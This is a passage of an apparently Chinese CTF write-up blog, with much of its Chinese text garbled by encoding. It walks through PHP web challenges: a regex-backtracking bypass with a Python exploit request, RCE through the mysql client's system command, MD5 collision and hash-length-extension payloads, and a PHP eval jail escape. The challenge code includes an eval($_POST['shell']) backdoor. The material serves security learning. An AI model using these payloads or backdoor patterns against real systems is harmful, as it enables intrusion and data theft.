æ˜¯hackerè¿˜æ•¢è‡ªæŠ¥å®¶é—¨å‘¢ï¼Ÿ&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$try</span>,<span class="hljs-string">&#x27;HACKER&#x27;</span>) === <span class="hljs-literal">TRUE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ è¿è‡ªå·±æ˜¯hackeréƒ½ä¸æ‰¿è®¤ï¼Œè¿˜æƒ³è¦flagå‘¢ï¼Ÿ&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&#x27;php&#x27;</span>)!==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æ”¶æ‰‹å§hackerï¼Œä½ å¾—ä¸åˆ°flagçš„ï¼&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>))-&gt;<span class="hljs-variable">$c</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;114514åˆ°åº•æ˜¯å•¥æ„æ€å˜ï¼Ÿã€‚ï¼Ÿ&quot;</span>);<br>&#125;<br><span class="hljs-comment"># è§‰å¾—å›°éš¾çš„è¯å°±ç›´æ¥æŠŠshellæ‹¿å»ç”¨å§ï¼Œä¸ç”¨è°¢~</span><br><span class="hljs-variable">$shell</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œe_m.pæœ‰ç‰¹æ®Šå­—ç¬¦å’Œ.æ‰€ä»¥è¦å°†æ¢æˆ[</p><p>å› ä¸º.+?æ˜¯åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦,è‡³å°‘éœ€è¦ä¸€ä¸ªå­—ç¬¦,æ‰€ä»¥å¿…é¡»è®©HACKERå‡ºç°åœ¨tryçš„å‚æ•°ä¸­ï¼Œä½†ä¸æ˜¯åœ¨å¼€å¤´</p><blockquote><ul><li><code>.+?</code> æ˜¯ã€Œéè´ªå©ªåŒ¹é…ã€ï¼Œæœ¬æ„æ˜¯åŒ¹é…ã€Œä»»æ„æœ€å°‘å­—ç¬¦ã€åæ¥ <code>HACKER</code>ï¼›</li><li>ä½†å½“ <code>HACKER</code> å‡ºç°åœ¨<strong>æé•¿å­—ç¬¦ä¸²çš„æœ«å°¾</strong>ï¼ˆæ¯”å¦‚ 100 ä¸‡ + ä¸ª <code>-</code> ä¹‹åï¼‰ï¼Œæ­£åˆ™å¼•æ“ä¼šé™·å…¥ã€Œæ— é™å›æº¯ã€ï¼š<ol><li>éè´ªå©ªçš„ <code>.+?</code> å…ˆåŒ¹é… 1 ä¸ª <code>-</code>ï¼Œæ£€æŸ¥åé¢æ˜¯å¦æ˜¯ <code>HACKER</code> â†’ ä¸æ˜¯ï¼›</li><li>åŒ¹é… 2 ä¸ª <code>-</code>ï¼Œæ£€æŸ¥åé¢ â†’ ä¸æ˜¯ï¼›</li><li>é‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œç›´åˆ°åŒ¹é… 1000001 ä¸ª <code>-</code> åï¼Œæ‰æ‰¾åˆ°æœ«å°¾çš„ <code>HACKER</code>ï¼›</li><li>PHP å¯¹æ­£åˆ™å›æº¯æœ‰<strong>å†…å­˜ &#x2F; æ—¶é—´é™åˆ¶</strong>ï¼ˆé»˜è®¤é…ç½®ä¸‹ï¼Œè¶…è¿‡ä¸€å®šå›æº¯æ¬¡æ•°ä¼šç›´æ¥è¿”å› <code>false</code>ï¼‰ï¼Œå¯¼è‡´ <code>preg_match</code> æ‰§è¡Œè¶…æ—¶ &#x2F; å†…å­˜æº¢å‡ºï¼Œæœ€ç»ˆè¿”å› <code>false</code>ï¼Œç¬¬ä¸€æ®µæ£€æµ‹è¢«ç»•è¿‡ã€‚</li></ol></li></ul></blockquote><p>ä»£ç  <code>(new $a($b))-&gt;$c()</code>åŠ¨æ€å®ä¾‹åŒ–ç±» <code>$a</code>ï¼ˆå‚æ•°ä¸º <code>$b</code>ï¼‰ï¼Œå¹¶è°ƒç”¨æ–¹æ³• <code>$c()</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>res = requests.post(<span class="hljs-string">&quot;http://101.37.149.223:32943/index.php?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString&quot;</span>,data = &#123;<span class="hljs-string">&quot;try&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>*<span class="hljs-number">1000001</span>+<span class="hljs-string">&quot;HACKER&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><blockquote><p>requests.postè¯­æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;response = requests.post(<br> url,        <span class="hljs-comment"># å¿…ä¼ ï¼šè¯·æ±‚çš„URLåœ°å€</span><br> data=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># å¯é€‰ï¼šè¡¨å•æ ¼å¼çš„è¯·æ±‚ä½“ï¼ˆdict/å­—ç¬¦ä¸²/å­—èŠ‚ï¼‰</span><br>    json=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># å¯é€‰ï¼šJSONæ ¼å¼çš„è¯·æ±‚ä½“ï¼ˆdictï¼Œè‡ªåŠ¨åºåˆ—åŒ–+è®¾ç½®Content-Type: application/jsonï¼‰</span><br>    headers=<span class="hljs-literal">None</span>, <span class="hljs-comment"># å¯é€‰ï¼šè¯·æ±‚å¤´ï¼ˆdictï¼‰</span><br>    params=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># å¯é€‰ï¼šURLä¸­çš„GETå‚æ•°ï¼ˆdictï¼‰</span><br>    files=<span class="hljs-literal">None</span>,   <span class="hljs-comment"># å¯é€‰ï¼šæ–‡ä»¶ä¸Šä¼ ï¼ˆdictï¼‰</span><br>    timeout=<span class="hljs-literal">None</span>, <span class="hljs-comment"># å¯é€‰ï¼šè¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼Œé˜²æ­¢è¯·æ±‚æŒ‚èµ·ï¼‰</span><br>    verify=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># å¯é€‰ï¼šæ˜¯å¦éªŒè¯SSLè¯ä¹¦ï¼ˆFalseå¿½ç•¥è¯ä¹¦é”™è¯¯ï¼‰</span><br>    cookies=<span class="hljs-literal">None</span>  <span class="hljs-comment"># å¯é€‰ï¼šè¯·æ±‚æºå¸¦çš„Cookieï¼ˆdictï¼‰</span><br>   )<br></code></pre></td></tr></table></figure></blockquote><h1 id="RCE-or-Sql-Inject"><a href="#RCE-or-Sql-Inject" class="headerlink" title="RCE or Sql Inject"></a>RCE or Sql Inject</h1><p>æ‰“å¼€å®¹å™¨ï¼Œé¢˜ç›®å·²ç»ç»™å‡ºç¯å¢ƒæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/se|ec|;|@|del|into|outfile/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰sqlæ³¨å…¥&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰RCE&quot;</span>);<br>&#125;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>);<br></code></pre></td></tr></table></figure><p>å’Œonly one sqlé‚£é“é¢˜æ¯”è¾ƒç›¸ä¼¼ï¼Œå¤šç¦ç”¨äº†ä¸€äº›å‚æ•°ï¼Œsqlæ³¨å…¥åŸºæœ¬æ²¡å¯èƒ½äº†</p><p>é¢˜ç›®hint1ç»™å‡ºè¦RCEï¼Œhint2ç»™å‡ºmysqlè¿œç¨‹è¿æ¥å’Œå‘½ä»¤è¡Œæ“ä½œæœ‰åŒºåˆ«ï¼Œhint3ç»™å‡ºè¾“ä¸ªé—®å·çœ‹çœ‹</p><p>é¢˜ç›®æ˜¯ä¸€ä¸ªæ¯”è¾ƒå†·é—¨çš„è€ƒç‚¹ï¼Œmysqlå‘½ä»¤è¡Œç¨‹åºçš„å‘½ä»¤æ‰§è¡Œï¼Œå¸¸è§äºmysqlæœ‰suidæ—¶çš„ææƒ</p><p>hint3ä¸­æç¤ºè¾“ä¸ªé—®å·çœ‹çœ‹ï¼Œé‚£ä¹ˆå°±åœ¨mysqlå‘½ä»¤è¡Œä¸­è¾“å…¥ä¸ªé—®å·è¯•è¯•ï¼Œå¦‚ä¸‹</p><p>å…¶ä¸­æ³¨æ„åˆ°ä¸€è¡Œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">system</span>    (\<span class="hljs-operator">!</span>) <span class="hljs-keyword">Execute</span> a <span class="hljs-keyword">system</span> shell command.<br></code></pre></td></tr></table></figure><p>æ„æ€æ˜¯ä½¿ç”¨systemå…³é”®å­—æˆ–!å¯ä»¥ç›´æ¥é€šè¿‡mysqlå‘½ä»¤è¡Œæ‰§è¡Œä¸€ä¸ªsystem shellå‘½ä»¤ï¼Œå°è¯•ä¸€ä¸‹å¦‚ä¸‹å›¾æ‰€ç¤º</p><p>é‚£ä¹ˆé—®é¢˜å°±ç®€å•äº†ï¼Œä½¿ç”¨æ¢è¡Œç¬¦ç»•è¿‡æ³¨é‡Šçš„é™åˆ¶ï¼Œä½¿ç”¨systemæ‰§è¡Œå‘½ä»¤ï¼Œenvå¯ä»¥ç›´æ¥å‡ºflagï¼Œæƒ³è¦å¼¹shelléœ€è¦ç”¨bash -c â€œcommandâ€åŒ…è£¹ä¸€ä¸‹ä¹Ÿå¯ä»¥å¼¹å‡º</p><h1 id="æ‰€ä»¥ä½ è¯´ä½ æ‡‚-MD5"><a href="#æ‰€ä»¥ä½ è¯´ä½ æ‡‚-MD5" class="headerlink" title="æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?"></a>æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5 äº†?</span><br><br><span class="hljs-variable">$apple</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$apple</span> !== <span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ä»€ä¹ˆ? ä½ ç»•è¿‡å»äº†?</span><br><span class="hljs-comment">// åŠ å¤§å‰‚é‡!</span><br><span class="hljs-comment">// æˆ‘è¦è®©ä»–æˆä¸º string</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;appple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) == <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;éš¾å—?ä¸éš¾!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ä½ è¿˜æ˜¯ç»•è¿‡å»äº†?</span><br><span class="hljs-comment">// å“¦å“¦å“¦, æˆ‘å°‘äº†ä¸€ä¸ªç­‰äºå·</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apppple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;å˜»å˜», ä¸ä¼šäº†? æ²¡çœ‹ç›´æ’­å›æ”¾?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ä½ ä»¥ä¸ºè¿™å°±ç»“æŸäº†</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-comment">// ä½ æƒ³çœ‹åˆ° random çš„å€¼å—?</span><br><span class="hljs-comment">// ä½ ä¸æ˜¯å¾ˆæ‡‚ MD5 å—? é‚£æˆ‘å°±å‘Šè¯‰ä½ ä»–çš„ MD5 å§</span><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;<br><br><span class="hljs-comment">// check if name ends with &#x27;admin&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ä¸æ˜¯ç®¡ç†å‘˜ä¹Ÿæ¥å‡‘çƒ­é—¹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ä¼ªé€ ? NO NO NO!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// è®¤è¾“äº†, çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5</span><br><span class="hljs-comment">// é‚£ flag å°±ç»™ä½ å§</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚å¼ºç¢°æ’ç»•è¿‡</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">apppple<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;banananana<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><p>ç¬¬å››å±‚é€šè¿‡å°±æ˜¯å“ˆå¸Œé•¿åº¦æ‰©å±•ï¼Œè¿™é‡Œå°±é€šè¿‡hash-ext-attack-masteræ¥è‡ªåŠ¨ç”Ÿæˆ</p><p>bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16))è¿™é‡Œç›¸å½“äº96ä½çš„å­—ç¬¦ä¸²å³å¯†é’¥</p><p>nameé‡Œé¢åé¢è¦æ·»åŠ adminå­—ç¬¦ä¸²æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨åé¢æ·»åŠ ä¸€ä¸ªä»¥adminç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œå…¶å®ƒä»»æ„ï¼Œè¿™é‡Œå°±éšä¾¿ä¸ºqadmin</p><p>è¿™é‡Œé¢˜ç›®ä¼šç»™ä¸€ä¸ªåŸå§‹çš„md5å€¼</p><p><img src="https://pic1.imgdb.cn/item/694c85a126657af64c6db56c.png"></p><p><img src="https://pic1.imgdb.cn/item/694c85b026657af64c6db572.png"></p><h1 id="EZ-PHP-Jail"><a href="#EZ-PHP-Jail" class="headerlink" title="EZ_PHP_Jail"></a>EZ_PHP_Jail</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;hint.html&quot;</span>);<br><span class="hljs-variable">$Jail</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Jail_by.Happy&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Jail</span> == <span class="hljs-literal">null</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Do You Like My Jail?&quot;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Like_Jail</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(`|\$|a|c|s|require|include)/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">Like_Jail</span>(<span class="hljs-variable">$Jail</span>)) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$Jail</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Yes! you escaped from the jail! LOL!&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You will Jail in your life!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">// åœ¨HTMLè§£æåå†è¾“å‡ºPHPæºä»£ç </span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å½“ php ç‰ˆæœ¬â¼©äº 8 æ—¶ï¼ŒGET è¯·æ±‚çš„å‚æ•°åå«æœ‰ . ï¼Œä¼šè¢«è½¬ä¸º _ ï¼Œä½†æ˜¯å¦‚æœå‚æ•°åä¸­æœ‰ [ ï¼Œè¿™</p><p>ä¸ª [ ä¼šè¢«ç›´æ¥è½¬ä¸º _ ï¼Œä½†æ˜¯åâ¾¯å¦‚æœæœ‰ . ï¼Œè¿™ä¸ª . å°±ä¸ä¼šè¢«è½¬ä¸º _ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">?Jail[by.Happy=xxxxxx```<br></code></pre></td></tr></table></figure><p>ç°åœ¨è€ƒè™‘å¦‚ä½•å¾—åˆ° flagï¼Œåœ¨é¡µé¢æºç 